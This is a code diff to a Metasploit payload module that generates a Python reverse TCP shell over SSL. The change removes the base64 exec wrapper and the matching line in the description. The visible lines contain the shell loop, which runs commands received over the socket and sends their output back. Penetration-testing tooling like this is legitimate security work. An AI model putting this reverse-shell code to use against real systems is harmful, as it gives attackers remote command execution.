@@ -16,7 +16,7 @@ module Metasploit3
   def initialize(info = {})
     super(merge_info(info,
       'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
-      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
+      'Description'   => 'Creates an interactive shell via python, uses SSL.',
       'Author'        => 'RageLtMan',
       'License'       => BSD_LICENSE,
       'Platform'      => 'python',
@@ -58,9 +58,6 @@ module Metasploit3
     cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
 
     cmd
   end
